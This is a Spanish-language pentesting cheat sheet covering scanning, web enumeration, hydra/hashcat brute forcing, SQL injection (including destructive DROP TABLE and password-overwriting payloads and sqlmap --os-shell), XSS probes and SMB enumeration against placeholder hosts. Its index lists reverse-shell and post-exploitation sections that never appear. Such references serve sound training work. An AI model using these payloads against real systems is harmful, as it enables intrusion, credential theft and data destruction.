# CheatSheet Hacking
### Índice:
- [Comandos básicos](#comandos-básicos)
- [Enumeración de OS](#enumeración-de-os-sistema-operativo)
- [Puertos y servicios por defecto](#puertos-y-servicios-por-defecto)
- [Enumeración de hosts](#enumeración-de-hosts)
- [Escaneo de puertos y servicios](#escaneo-de-puertos-y-servicios)
- [Enumeración web](#enumeración-web)
- [Fuerza bruta](#fuerza-bruta)
- [Ataques SQLi](#sql-injection)
- [Ataques XSS](#ataques-xss)
- [SMB](#smb)
- [FTP](#ftp)
- [Cracking de contraseñas](#cracking-de-contraseñas)
- [Transferencia de archivos](#transferir-archivos)
- [Reverse Shell](#reverse-shell)
- [Post Explotación](#post-explotación)
- [Wireshark](#wireshark)

# Comandos básicos
| **Comando** | **Descripción** |
|-------------|-----------------|
| `sudo openvpn user.ovpn` | Conectarte a una red VPN usando un archivo de configuración `.ovpn`. |
| `ifconfig` / `ip a` | Ver las direcciones IP, interfaces de red y configuraciones de tu máquina. |
| `ip r` | Mostrar la tabla de rutas para entender el tráfico en tu red. |
| `netstat -rn` | Ver rutas y conexiones activas, útil para confirmar tráfico a través de VPN. |
| `arp -a` | Mostrar la tabla ARP para identificar dispositivos conectados a la red local. |
| `ssh user@10.10.10.10` | Conectarte a un servidor remoto vía SSH. |
| `ssh -i private_key.pem user@10.10.10.10` | Conectarte vía SSH utilizando un archivo de clave privada. |
| `scp file.txt user@10.10.10.10:/tmp/` | Transferir archivos a un servidor remoto vía SCP. |
| `ftp 10.10.10.10` | Conectarte a un servidor FTP de manera interactiva. |
| `ftp -p 10.10.10.10` | Conectarte a un servidor FTP en un puerto específico. |
| `nc -zv 10.10.10.10 22` | Verificar si un puerto específico está abierto. |
| `curl http://10.10.10.10` | Hacer una solicitud HTTP básica a una dirección URL o IP. |
| `wget http://10.10.10.10/file.txt` | Descargar un archivo desde un servidor remoto vía HTTP o HTTPS. |
| `traceroute 10.10.10.10` | Ver la ruta que toma un paquete para llegar a un host. |
| `ping -c 4 10.10.10.10` | Enviar 4 paquetes ICMP para verificar la conectividad con un host. |
| `whois 10.10.10.10` | Consultar información WHOIS sobre un dominio o IP. |
| `dig example.com` | Consultar registros DNS de un dominio. |
| `dig @8.8.8.8 example.com` | Consultar registros DNS utilizando un servidor DNS específico. |
| `nslookup example.com` | Consultar registros DNS de un dominio (modo interactivo o no). |
| `nmap -sn 10.10.10.10/24` | Escaneo simple de hosts activos en una red (sin escanear puertos). |
| `nmap -sP 10.10.10.10` | Similar al comando anterior, para descubrir hosts vivos. |
| `history | grep "command"` | Buscar comandos anteriores ejecutados en la terminal. |
| `alias ll='ls -la'` | Crear un alias para simplificar comandos largos. |
| `export PATH=$PATH:/custom/path` | Añadir rutas personalizadas al `PATH` para ejecutar herramientas específicas. |
| `chmod +x script.sh` | Dar permisos de ejecución a un archivo o script. |
| `tmux` / `screen` | Iniciar una sesión multiplexada para ejecutar comandos persistentes. |
| `crontab -l` | Listar las tareas programadas en el sistema. |
| `crontab -e` | Editar tareas programadas en el sistema. |


# Enumeración de OS (Sistema operativo)
## Identificación básica de sistemas operativos
| **Comando** | **Descripción** |
|-------------|-----------------|
| `ping -c 2 10.10.10.10` | Envía paquetes ICMP para verificar conectividad y observar el TTL (Time To Live). |
| `nmap -O 10.10.10.10` | Detecta el sistema operativo mediante técnicas de fingerprinting de Nmap. |
| `nmap --script=os-detection 10.10.10.10` | Ejecuta un script más avanzado de detección de OS. |
| `xprobe2 -v 10.10.10.10` | Herramienta especializada para fingerprinting de sistemas operativos. |
| `ttlscan 10.10.10.10` | Escanea TTL para deducir el sistema operativo remoto. |

## Interpretación de TTL (Time To Live)
| **Dispositivo (OS)** | **TTL esperado** |
|----------------------|------------------|
| Linux/Unix           | 64               |
| Windows              | 128              |
| Solaris/AIX          | 254              |
| Dispositivos Cisco   | 255              |

> **Nota:** El TTL observado puede variar debido a saltos intermedios en la red (routers). Se recomienda usar herramientas específicas para confirmar el OS.

## Escaneo avanzado para enumerar OS
| **Comando** | **Descripción** |
|-------------|-----------------|
| `nmap -sV 10.10.10.10` | Detecta versiones de servicios que pueden revelar información del OS. |
| `nmap -A 10.10.10.10` | Realiza un escaneo agresivo que incluye detección de OS, servicios y scripts de vulnerabilidad. |
| `netcat -vv 10.10.10.10 80` | Intenta conectarse a un puerto específico para obtener banners informativos. |
| `telnet 10.10.10.10 23` | Conexión manual para analizar respuestas del sistema. |
| `curl -I http://10.10.10.10` | Obtiene el encabezado HTTP para identificar servidores web y posibles pistas del OS. |
| `whatweb http://10.10.10.10` | Detecta tecnologías y servidores web, incluyendo pistas del sistema operativo. |

## Enumeración específica con SNMP (si está habilitado)
| **Comando** | **Descripción** |
|-------------|-----------------|
| `onesixtyone 10.10.10.10` | Enumeración básica de SNMP para obtener información del sistema. |
| `snmp-check 10.10.10.10` | Escaneo detallado para obtener datos del sistema operativo y configuración. |
| `snmpwalk -v 2c -c public 10.10.10.10` | Consulta los valores SNMP configurados, como el nombre del sistema o su descripción. |

## Identificación de OS a través de NetBIOS (Windows)
| **Comando** | **Descripción** |
|-------------|-----------------|
| `nbtscan 10.10.10.10` | Enumera información NetBIOS como nombre del equipo, dominio y OS. |
| `nmap --script nbstat.nse -p137 10.10.10.10` | Utiliza el script de Nmap para obtener información NetBIOS. |

## Otros métodos de detección pasiva
- **Wireshark**: Analiza tráfico en la red para identificar sistemas operativos según patrones de paquetes (puedes aplicar filtros como `ip.src == 10.10.10.10`).
- **Banners en servicios**: Inspecciona respuestas de servicios como SSH, HTTP o FTP para identificar versiones que puedan revelar el sistema operativo.

# Puertos y servicios por defecto
| **Puerto**     | **Servicio**        | **Descripción** |
|----------------|---------------------|-----------------|
| `25`           | SMTP                | Protocolo de envío de correos electrónicos. |
| `22`           | SSH                 | Conexión segura remota. |
| `110`          | POP3                | Protocolo de recuperación de correos electrónicos. |
| `143`          | IMAP                | Protocolo de acceso a correos electrónicos con almacenamiento en servidor. |
| `80`           | HTTP                | Servidor web estándar. |
| `443`          | HTTPS               | Servidor web seguro (HTTP sobre SSL/TLS). |
| `137,138,139`  | NETBIOS             | Protocolo utilizado en redes Windows para compartir archivos e impresoras. |
| `21`           | FTP                 | Protocolo de transferencia de archivos. |
| `3306`         | MySQL               | Base de datos MySQL. |
| `3389`         | RDP                 | Protocolo de escritorio remoto (Remote Desktop Protocol). |
| `53`           | DNS                 | Servidor de nombres de dominio (Domain Name System). |
| `69`           | TFTP                | Protocolo de transferencia de archivos trivial (Trivial File Transfer Protocol). |
| `161,162`      | SNMP                | Protocolo de administración de red simple (Simple Network Management Protocol). |
| `514`          | Syslog              | Protocolo de registro de eventos del sistema. |
| `445`          | SMB                 | Protocolo de archivos compartidos de Windows (Server Message Block). |
| `161`          | SNMP                | Protocolo de administración de red simple. |
| `139`          | NetBIOS/SMB         | Utilizado por redes Windows para compartir archivos. |
| `23`           | Telnet              | Protocolo de conexión remota (no seguro). |
| `1433`         | MS SQL              | Base de datos Microsoft SQL Server. |
| `5432`         | PostgreSQL          | Base de datos PostgreSQL. |
| `5900`         | VNC                 | Protocolo de escritorio remoto (Virtual Network Computing). |
| `6000`         | X11                 | Servidor gráfico de Unix/Linux. |
| `8000-8010`    | HTTP alternativo    | Puertos adicionales utilizados por servidores web en ciertas aplicaciones. |
| `9200`         | Elasticsearch       | Servicio de búsqueda y análisis distribuido. |
| `27017`        | MongoDB             | Base de datos MongoDB. |
| `27015`        | Steam (juegos)      | Servicio de juegos en línea. |
| `8080`         | HTTP alternativo    | Puerto utilizado para aplicaciones web o proxies. |
| `8443`         | HTTPS alternativo   | Puerto utilizado para HTTPS en algunas aplicaciones web. |
| `5900`         | VNC                 | Protocolo de escritorio remoto. |

## Puertos adicionales para servicios específicos
| **Puerto**     | **Servicio**        | **Descripción** |
|----------------|---------------------|-----------------|
| `3306`         | MySQL               | Base de datos MySQL. |
| `6379`         | Redis               | Base de datos en memoria clave-valor (NoSQL). |
| `5432`         | PostgreSQL          | Base de datos PostgreSQL. |
| `8080`         | HTTP (proxy)        | Servidor HTTP alternativo, a menudo utilizado por proxies o aplicaciones web. |
| `9000`         | PHP-FPM             | Servidor FastCGI para procesar solicitudes PHP. |

> **Nota:** Los servicios que escuchan en puertos comunes pueden ser configurados para usar puertos no estándar como medida de seguridad. Durante un escaneo, es recomendable realizar escaneos completos de puertos para detectar servicios ocultos.

# Enumeración de hosts
## Herramientas y comandos
| **Comando**                     | **Descripción** |
|----------------------------------|-----------------|
| `fping`                          | Envía pings a múltiples hosts para determinar cuáles están activos. |
| `sudo fping -a -g 10.10.10.10/24 2>/dev/null` | Realiza un escaneo de hosts activos en la red 10.10.10.10/24. |
| `nmap -sn 10.10.10.10/24`        | Realiza un escaneo de ping (sin escanear puertos) para descubrir hosts activos en una subred. |
| `nmap -T4 -F 10.10.10.10/24`     | Realiza un escaneo rápido de puertos en toda una subred para identificar hosts activos. |
| `arp-scan -l`                    | Escanea la red local para encontrar dispositivos conectados mediante ARP. |
| `netdiscover -r 10.10.10.0/24`   | Realiza un escaneo ARP para encontrar dispositivos en una red. |
| `ping 10.10.10.10`               | Realiza un ping a un host específico para verificar su disponibilidad. |
| `fping -g 10.10.10.10 10.10.10.20`| Escanea una gama de direcciones IP para determinar cuáles están activas. |
| `masscan 10.10.10.0/24 -p80`     | Escanea rápidamente los puertos 80 de todos los hosts en una subred. |
| `hping3 --syn -p 80 10.10.10.10`  | Realiza un escaneo SYN para detectar si un puerto está abierto. |
| `dig @8.8.8.8 example.com`       | Realiza una consulta DNS para resolver un dominio. |
| `whois 10.10.10.10`              | Realiza una consulta WHOIS para obtener información sobre una IP. |

## Opciones adicionales para enumeración de hosts
- **Con Nmap:**
  - `nmap -sn 10.10.10.10/24` (escaneo de ping simple).
  - `nmap -sP 10.10.10.10/24` (escaneo de hosts activos).
  - `nmap -n -sP 10.10.10.0/24` (escaneo sin resolver nombres de dominio).
  - `nmap -O 10.10.10.10` (detección de sistema operativo, útil si hay pocos hosts activos).
  
- **Con ARP Scan:**
  - `sudo arp-scan -l` (escaneo de toda la red local).
  - `sudo arp-scan --interface=eth0 10.10.10.0/24` (escaneo ARP en una red específica).

## Usar Nmap para escanear redes específicas
| **Comando**                        | **Descripción** |
|-------------------------------------|-----------------|
| `nmap -sP 10.10.10.10/24`           | Realiza un escaneo de ping para identificar hosts activos en una subred. |
| `nmap -sn 10.10.10.10-50`           | Escanea los primeros 50 hosts de una subred. |
| `nmap -T4 -sn 10.10.10.10/24`       | Escaneo de hosts activos con una velocidad mayor (modo T4). |

> **Nota**: Es recomendable usar diferentes herramientas dependiendo de las circunstancias (por ejemplo, `fping` es rápido para escanear IPs, mientras que `nmap` ofrece más detalles sobre cada host).

# Escaneo de puertos y servicios
## Nmap (Escaneo de puertos)
| **Comando**                                      | **Descripción** |
|--------------------------------------------------|-----------------|
| `nmap -p- -sS --min-rate 5000 -Pn -n 10.10.10.10` | Realiza un escaneo de puertos completo (`-p-`) utilizando un escaneo SYN (half-open) a alta velocidad (`--min-rate 5000`), deshabilitando la detección de host (`-Pn`) y sin resolver nombres (`-n`). |
| `nmap -p21,22,80 -sCV 10.10.10.10 -oN servicesScan` | Escaneo de puertos específicos (21, 22, 80) con detección de versiones (`-sCV`) y guarda los resultados en un archivo (`-oN`). |
| `nmap -sS -p 1-65535 10.10.10.10`                | Realiza un escaneo completo de puertos (1-65535) con un escaneo SYN. |
| `nmap -sV -p 80,443 10.10.10.10`                 | Escaneo de puertos 80 y 443 con detección de versiones (`-sV`). |
| `nmap -A 10.10.10.10`                            | Escaneo agresivo que incluye la detección de sistema operativo, versiones de servicios, scripts de vulnerabilidades, etc. |
| `nmap -sC -p 80,443 10.10.10.10`                 | Ejecuta scripts de Nmap predeterminados sobre los puertos 80 y 443. |
| `nmap -sU -p 161 10.10.10.10`                    | Escaneo de puertos UDP, en este caso el puerto 161 para SNMP. |
| `nmap -T4 -p 80 --open -oG output.gnmap 10.10.10.10` | Escaneo rápido de un puerto con opción de salida en formato "grepable" (`-oG`). |

## Masscan (Escaneo rápido)
| **Comando**                                            | **Descripción** |
|--------------------------------------------------------|-----------------|
| `sudo masscan -p 21,22,80 --rate 64000 --open-only -oG masscan.gnmap 10.10.10.10/24` | Escaneo rápido de puertos 21, 22 y 80 en una subred con un alto número de paquetes por segundo (`--rate 64000`). Guarda el resultado en formato "grepable" (`-oG`). |
| `sudo masscan -p0-65535 --rate 1000000 10.10.10.10`    | Escaneo de todos los puertos (0-65535) a máxima velocidad (`--rate 1000000`). |
| `sudo masscan -p 443 --rate 10000 10.10.10.10`         | Escaneo rápido del puerto 443 (HTTPS) en un objetivo específico. |

## Opciones adicionales de escaneo
### Escaneo de puertos con detección de versiones y OS
| **Comando**                                      | **Descripción** |
|--------------------------------------------------|-----------------|
| `nmap -sV -O -p 80,443 10.10.10.10`              | Escaneo con detección de versiones de servicios (`-sV`) y detección del sistema operativo (`-O`). |
| `nmap -A 10.10.10.10`                            | Escaneo agresivo con detección de OS, versiones, scripts de vulnerabilidad y traceroute. |

### Escaneo de puertos con scripts específicos
| **Comando**                                      | **Descripción** |
|--------------------------------------------------|-----------------|
| `nmap --script=default -p 80,443 10.10.10.10`     | Ejecuta los scripts predeterminados de Nmap para puertos 80 y 443. |
| `nmap --script=http-vuln-cve2006-3392.nse -p 80 10.10.10.10` | Escanea el puerto 80 para detectar vulnerabilidades específicas en aplicaciones web. |

### Escaneo rápido y limitado
| **Comando**                                      | **Descripción** |
|--------------------------------------------------|-----------------|
| `nmap -T4 -p 80,443,22 10.10.10.10`              | Realiza un escaneo más rápido con Nmap en puertos específicos (80, 443, 22). |
| `masscan -p 80 --rate 10000 -oG masscan_results 10.10.10.10/24` | Escaneo masivo de puertos HTTP con una alta tasa de paquetes por segundo. |

> **Nota:** Masscan es muy rápido, pero menos preciso que Nmap, ya que no realiza las mismas comprobaciones a fondo, por lo que puede ser útil para una primera ronda de escaneo rápido.

# Enumeración web
## Herramientas y comandos comunes
| **Comando**                                          | **Descripción** |
|------------------------------------------------------|-----------------|
| **whatweb**                                          | Identifica tecnologías utilizadas en un sitio web, como CMS, servidores, etc. |
| `whatweb http://10.10.10.10`                         | Ejemplo de uso de WhatWeb para identificar tecnologías en un sitio web. |
| **gobuster**                                         | Realiza un escaneo de directorios y archivos en un servidor web utilizando una lista de palabras. |
| `gobuster dir -w /opt/wordlist.txt -u http://10.10.10.10/` | Ejemplo de escaneo de directorios y archivos en `http://10.10.10.10/` usando un archivo de palabras. |
| **dirb**                                             | Herramienta similar a Gobuster, pero menos eficiente en comparación. Realiza un escaneo de directorios en un servidor web. |
| `dirb http://10.10.10.10/`                           | Escanea el servidor web en `http://10.10.10.10/` buscando directorios y archivos. |
| **nikto**                                            | Realiza un escaneo de seguridad en un servidor web, buscando vulnerabilidades comunes. |
| `nikto -host http://10.10.10.10`                     | Ejemplo de uso de Nikto para escanear un servidor web en busca de vulnerabilidades comunes. |

## Herramientas adicionales para escaneo web
| **Comando**                                          | **Descripción** |
|------------------------------------------------------|-----------------|
| **wpscan**                                           | Herramienta dedicada a escanear vulnerabilidades en sitios web que utilizan WordPress. |
| `wpscan --url http://10.10.10.10 --enumerate u`       | Escanea un sitio WordPress en busca de usuarios. |
| **aquatone**                                         | Herramienta para enumerar subdominios de un dominio y realizar un escaneo de aplicaciones web. |
| `aquatone -scan http://10.10.10.10`                  | Escanea el sitio para obtener información sobre subdominios y posibles vulnerabilidades. |
| **dirbuster**                                        | Realiza un escaneo de directorios similar a Gobuster, con una interfaz gráfica. |
| `dirbuster -u http://10.10.10.10/ -w /opt/wordlist.txt` | Utiliza DirBuster para realizar un escaneo con un archivo de palabras específico. |

## Comandos útiles para obtener información sobre la web
| **Comando**                                          | **Descripción** |
|------------------------------------------------------|-----------------|
| **curl**                                             | Realiza solicitudes HTTP a un servidor web. Utilizado para obtener información de páginas web o probar respuestas. |
| `curl -I http://10.10.10.10`                         | Obtiene solo los encabezados HTTP de la página de destino. |
| **httpx**                                            | Realiza un escaneo de HTTP para verificar qué servidores web están activos y qué tecnologías utilizan. |
| `httpx -l hosts.txt -o results.txt`                  | Escanea los hosts en `hosts.txt` y guarda los resultados en `results.txt`. |

## Escaneo de subdominios
| **Comando**                                          | **Descripción** |
|------------------------------------------------------|-----------------|
| **sublist3r**                                        | Herramienta para enumerar subdominios de un dominio. |
| `sublist3r -d example.com`                           | Realiza un escaneo de subdominios de `example.com`. |
| **amass**                                            | Realiza un escaneo avanzado de subdominios utilizando diferentes fuentes de información. |
| `amass enum -d example.com -o subdomains.txt`        | Escanea subdominios de `example.com` y guarda los resultados en `subdomains.txt`. |

## Detección de CMS
| **Comando**                                          | **Descripción** |
|------------------------------------------------------|-----------------|
| **whatweb**                                          | Identifica tecnologías y CMS utilizados por un sitio web. |
| `whatweb http://10.10.10.10`                         | Realiza una consulta para identificar tecnologías en `http://10.10.10.10`. |
| **wappalyzer**                                       | Extensión de navegador para identificar tecnologías en aplicaciones web. |
| `wappalyzer http://10.10.10.10`                      | Identifica tecnologías en `http://10.10.10.10`. |

## Otras herramientas y técnicas para la enumeración web
| **Comando**                                          | **Descripción** |
|------------------------------------------------------|-----------------|
| **Burp Suite**                                       | Suite de herramientas para pruebas de seguridad en aplicaciones web. Incluye proxy, escáner de vulnerabilidades y muchas otras herramientas. |
| **zaproxy**                                          | Alternativa de código abierto a Burp Suite, para realizar pruebas de seguridad en aplicaciones web. |
| **ffuf**                                             | Realiza búsquedas de directorios y archivos web de manera rápida. |
| `ffuf -w /opt/wordlist.txt -u http://10.10.10.10/FUZZ` | Realiza un escaneo de directorios con el patrón FUZZ, donde se sustituyen los resultados de la lista de palabras. |

# Fuerza bruta
## Hydra (Ataques de fuerza bruta a servicios)
| **Comando**                                                   | **Descripción** |
|---------------------------------------------------------------|-----------------|
| `hydra -L users.txt -P /usr/share/wordlist/rockyou.txt ejemplo.com http /admin/` | Realiza un ataque de fuerza bruta sobre un formulario web HTTP en `http://ejemplo.com/admin/` usando una lista de usuarios (`-L`) y contraseñas (`-P`). |
| `hydra -l admin -P /usr/share/wordlist/rockyou.txt ftp://10.10.10.10` | Ataque de fuerza bruta al servicio FTP de un servidor en `10.10.10.10` con la lista de contraseñas `rockyou.txt` para el usuario `admin`. |
| `hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10` | Realiza un ataque de fuerza bruta al servicio SSH sobre el usuario `root` en `10.10.10.10` usando la lista `rockyou.txt`. |
| `hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -t 4 -f 10.10.10.10 ssh` | Ataque de fuerza bruta a SSH con la opción `-t 4` para usar hasta 4 hilos y `-f` para detenerse después de encontrar la primera contraseña válida. |
| `hydra -V -l admin -P /usr/share/wordlists/rockyou.txt smtp://10.10.10.10` | Ataque de fuerza bruta a un servidor SMTP sobre el usuario `admin` con la lista `rockyou.txt` y salida detallada (`-V`). |

## John the Ripper (Cracking de contraseñas)
| **Comando**                                                    | **Descripción** |
|--------------------------------------------------------------|-----------------|
| `john --wordlist=/usr/share/wordlists/rockyou.txt crack.hash`   | Realiza un ataque de diccionario a un archivo de contraseñas (`crack.hash`) utilizando la lista de palabras `rockyou.txt`. |
| `john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt` | Ataca hashes MD5 utilizando la lista de palabras `rockyou.txt`. Especifica el formato de hash como `raw-md5`. |
| `john --incremental --format=raw-md5 hash.txt`                | Realiza un ataque de fuerza bruta completo con el modo `incremental`, que prueba todas las combinaciones posibles de caracteres. |
| `john --show crack.hash`                                      | Muestra las contraseñas descifradas almacenadas en el archivo `crack.hash`. |
| `john --rules --wordlist=/usr/share/wordlists/rockyou.txt hash.txt` | Realiza un ataque de fuerza bruta inteligente con reglas adicionales para modificar las contraseñas del diccionario (como mayúsculas, números, etc.). |

## Hashcat (Cracking de contraseñas con aceleración por GPU)
| **Comando**                                                   | **Descripción** |
|---------------------------------------------------------------|-----------------|
| `hashcat -m 1000 crack.hash /usr/share/wordlists/rockyou.txt`  | Ataque de fuerza bruta para hashes NTLM (hashes de contraseñas de Windows) usando el diccionario `rockyou.txt`. |
| `hashcat -m 1000 -a 0 -o cracked.txt crack.hash /usr/share/wordlists/rockyou.txt` | Ataque de diccionario en formato NTLM (`-m 1000`), con salida de contraseñas descifradas en el archivo `cracked.txt`. |
| `hashcat -m 0 crack.hash /usr/share/wordlists/rockyou.txt`    | Ataque de diccionario para hashes MD5. |
| `hashcat -m 0 -a 3 crack.hash ?a?a?a?a?a?a`                  | Ataque de fuerza bruta utilizando todos los caracteres posibles (alfa, numérico, especial) de longitud 6 (`?a?a?a?a?a?a`). |
| `hashcat -m 22000 -a 3 -o cracked.txt crack.hash ?a?a?a?a?a?a` | Ataque de fuerza bruta a hashes WPA2 con el modo `-m 22000`, usando caracteres especiales para el ataque. |
| `hashcat -m 3000 crack.hash /usr/share/wordlists/rockyou.txt` | Ataque de diccionario a hashes LM (sistema antiguo de contraseñas de Windows). |

## Patrones comunes de fuerza bruta
| **Comando**                                                   | **Descripción** |
|---------------------------------------------------------------|-----------------|
| `hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10` | Ataque de fuerza bruta a SSH usando `admin` como nombre de usuario y el diccionario `rockyou.txt` para las contraseñas. |
| `john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt` | Realiza un ataque a hashes MD5 con un diccionario específico. |
| `hashcat -m 1000 crack.hash /usr/share/wordlists/rockyou.txt`  | Crackeo de hashes NTLM con el diccionario `rockyou.txt`. |
| `hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://10.10.10.10/login` | Ataque de fuerza bruta a una página de login web usando `admin` como usuario. |


### Consideraciones adicionales
1. **Velocidad**: Los ataques de fuerza bruta pueden ser lentos dependiendo de la complejidad de la contraseña y la herramienta que estés utilizando. Herramientas como Hashcat son mucho más rápidas que John the Ripper debido a su uso de GPUs.
2. **Diccionarios**: Usar un diccionario adecuado es clave. Además de `rockyou.txt`, puedes utilizar diccionarios más específicos según el contexto del objetivo.
3. **Técnicas avanzadas**: Aparte del ataque de diccionario, puedes usar técnicas como reglas de modificación de contraseñas (en `john` y `hashcat`) o ataques de combinación, que pueden hacer el proceso más eficiente.

# SQL Injection
## Comandos principales

| **Comando**                                                   | **Descripción** |
|---------------------------------------------------------------|-----------------|
| `sqlmap -u "http://10.10.10.10/file.php?id=1" --dbs`           | Usado para detectar y enumerar las bases de datos disponibles en un sitio web vulnerable a SQLi en la URL proporcionada. |
| `sqlmap -u "http://10.10.10.10/file.php?id=1" --tables`        | Enumera las tablas dentro de la base de datos seleccionada. |
| `sqlmap -u "http://10.10.10.10/file.php?id=1" -D database_name --columns` | Enumera las columnas de una tabla específica de la base de datos indicada. |
| `sqlmap -u "http://10.10.10.10/file.php?id=1" -D database_name -T users --dump` | Extrae (dumps) datos de la tabla `users` en la base de datos especificada. |
| `sqlmap -u "http://10.10.10.10/file.php?id=1" --os-shell`     | Intenta obtener una shell de sistema operativo mediante inyección SQL. |
| `sqlmap -u "http://10.10.10.10/file.php?id=1" --risk=3 --level=5` | Aumenta la profundidad y el riesgo del escaneo, lo que puede ser útil para encontrar vulnerabilidades más complejas. |
| `sqlmap -u "http://10.10.10.10/file.php?id=1" --technique=BEUSTQ` | Especifica los tipos de técnicas de inyección SQL a probar. Las opciones incluyen: `B` (blind), `E` (error-based), `U` (union), `S` (stacked queries), `T` (time-based), `Q` (inline queries). |
| `sqlmap -u "http://10.10.10.10/file.php?id=1" --tamper=space2comment` | Utiliza técnicas de evasión para intentar bypass los filtros de seguridad en la web (por ejemplo, `space2comment` reemplaza espacios por comentarios en SQL). |

## Técnicas comunes de inyección SQL

| **Comando**                                                    | **Descripción** |
|--------------------------------------------------------------|-----------------|
| `OR 1=1 -- -`                                                | Inyección simple para verificar si el campo es vulnerable. Esta consulta siempre devolverá resultados debido a la condición `OR 1=1`. |
| `UNION SELECT 1,2,3--`                                        | Inyección de unión para combinar la consulta original con una nueva consulta que devuelve valores específicos. El `--` es utilizado para comentar el resto de la consulta original. |
| `UNION SELECT NULL,NULL,NULL --`                               | Intento de inyección utilizando valores nulos para obtener una lista de columnas de la tabla que se está consultando. |
| `'; DROP TABLE users--`                                       | Inyección que intenta eliminar una tabla en la base de datos si el sistema no valida correctamente las entradas. |
| `';--`                                                       | Comando que termina la consulta SQL y comenta el resto. Esto puede permitir alterar la lógica de la consulta y ejecutar código arbitrario. |
| `' OR 'a'='a`                                                 | Inyección booleana para verificar si la aplicación permite inyección. En este caso, siempre devolverá `true`. |
| `'; UPDATE users SET password='newpassword' WHERE id=1 --`    | Inyección que modifica el valor de una columna de la tabla `users`, como en el caso de cambiar una contraseña. |
| `SELECT 1, user, password FROM users--`                       | Inyección que intenta recuperar datos específicos de la tabla `users` (como `user` y `password`). |

## SQLi en formularios y URLs

| **Comando**                                                    | **Descripción** |
|---------------------------------------------------------------|-----------------|
| `http://10.10.10.10/search.php?search=1' OR 'a'='a`           | Inyección en un parámetro de búsqueda dentro de una URL para probar vulnerabilidad de SQLi. |
| `http://10.10.10.10/login.php?username=admin&password=1' OR 'a'='a` | Inyección SQL en un formulario de login, que puede permitir acceder sin una contraseña válida. |
| `http://10.10.10.10/product.php?id=1' UNION SELECT username, password FROM users --` | Inyección SQL para listar los nombres de usuario y contraseñas de una tabla `users` desde la URL. |

## Tipos comunes de vulnerabilidades SQLi

1. **Error-based SQLi**: Se utiliza un error SQL para extraer información del servidor, por ejemplo:
   - `http://10.10.10.10/page.php?id=1' AND 1=CONVERT(int, (SELECT @@version)) --`
   
2. **Blind SQLi**: La inyección SQL no produce un error visible, pero se pueden obtener respuestas basadas en el tiempo o la lógica booleana, como:
   - `http://10.10.10.10/page.php?id=1' AND 1=1 --`
   - `http://10.10.10.10/page.php?id=1' AND 1=2 --`
   La diferencia entre ambas consultas nos indica si la inyección es exitosa (respuesta positiva o negativa según el resultado lógico).

3. **Time-based Blind SQLi**: Se utiliza un retraso en la consulta SQL para determinar si la inyección es exitosa.
   - `http://10.10.10.10/page.php?id=1' AND IF(1=1, SLEEP(5), 0) --`

# Ataques XSS 

## Comandos y Ejemplos

| **Comando**                                     | **Descripción** |
|-------------------------------------------------|-----------------|
| `<script>alert('xss')</script>`                  | Inyección básica de un script que muestra una alerta en el navegador, útil para probar si el sitio es vulnerable a XSS. |
| `<h1>H1</h1>`                                   | Ejemplo simple de inyección HTML que inserta una cabecera `<h1>` en la página. Aunque no es un ataque, puede ayudar a probar si el contenido es inyectado de manera insegura. |
| `<img src="x" onerror="alert('XSS')">`          | Inyección de una imagen con un manejador de error, que ejecuta un script cuando la imagen no se carga correctamente. Es un tipo común de XSS basado en eventos. |
| `<a href="javascript:alert('XSS')">Click Me</a>` | Inyección de un enlace que, al hacer clic, ejecuta un script. Esto se aprovecha si el sitio permite `javascript:` en enlaces sin validación adecuada. |
| `<div onmouseover="alert('XSS')">Hover me</div>` | Inyección en un evento de mouse (mouseover), que ejecuta el script cuando el usuario pasa el ratón por encima del `<div>`. |
| `<body onload="alert('XSS')">`                  | Utiliza el evento `onload` en la etiqueta `<body>`, que ejecuta un script cuando la página se carga. |

## Tipos de XSS

1. **Reflected XSS (XSS reflejado)**:
   - Ocurre cuando un atacante inyecta un script en una URL que es reflejada de inmediato por el servidor sin ser filtrada ni desinfectada.
   - Ejemplo:
     ```html
     http://example.com/search?q=<script>alert('XSS')</script>
     ```
     Al hacer clic en el enlace, el servidor refleja el contenido inyectado y lo ejecuta en el navegador del usuario.

2. **Stored XSS (XSS almacenado)**:
   - Se produce cuando el script malicioso es almacenado permanentemente en el servidor, por ejemplo, en una base de datos o en una sesión.
   - El atacante inyecta un script a través de un formulario o una entrada de usuario (como comentarios en un blog) y, cuando otro usuario accede a la página, el script se ejecuta.
   - Ejemplo:
     ```html
     <textarea name="comment"><script>alert('XSS')</script></textarea>
     ```

3. **DOM-based XSS (XSS basado en DOM)**:
   - En este caso, el XSS no es reflejado ni almacenado en el servidor, sino que ocurre cuando el código JavaScript de la página manipula el DOM de forma insegura.
   - Ejemplo:
     ```javascript
     document.getElementById("username").innerHTML = location.hash.substring(1);
     ```
     Si la URL contiene un hash con un script malicioso, el navegador lo ejecuta cuando se manipula el DOM.

## Comprobación de XSS

Para verificar si un sitio es vulnerable a XSS, se pueden probar varias inyecciones en diferentes parámetros de entrada como:
- Campos de formulario (comentarios, nombres de usuario, contraseñas).
- Parámetros de la URL.
- Cabeceras HTTP (como `User-Agent` o `Referer`).
  
Algunos ejemplos son:
http://example.com/search?q=<script>alert('XSS')</script>


# SMB 

## Enumeración SMB

| **Comando**                                      | **Descripción** |
|--------------------------------------------------|-----------------|
| `smbclient -L 10.10.10.10 -N`                     | Enumerar los recursos compartidos en el host sin autenticación (`-N` significa "no password"). |
| `smbmap -H 10.10.10.10 -u "null"`                | Enumerar los recursos compartidos SMB sin credenciales, útil para ver qué comparticiones están disponibles para usuarios no autenticados. |
| `nmap --script=smb-vuln* -p445 10.10.10.10`      | Usar scripts de Nmap para detectar vulnerabilidades en el servicio SMB (por ejemplo, `smb-vuln-ms17-010` para detectar EternalBlue). |
| `enum4linux -a 10.10.10.10`                      | Herramienta para la enumeración de SMB en sistemas Windows. Permite obtener información sobre usuarios, grupos, políticas, y recursos compartidos. |
| `smbclient //10.10.10.10/share`                  | Acceder a un recurso compartido SMB, reemplaza `share` por el nombre del recurso compartido. |
| `nmap -p 445 --script=smb-os-fingerprint 10.10.10.10` | Usar el script `smb-os-fingerprint` de Nmap para identificar el sistema operativo del servidor SMB. |
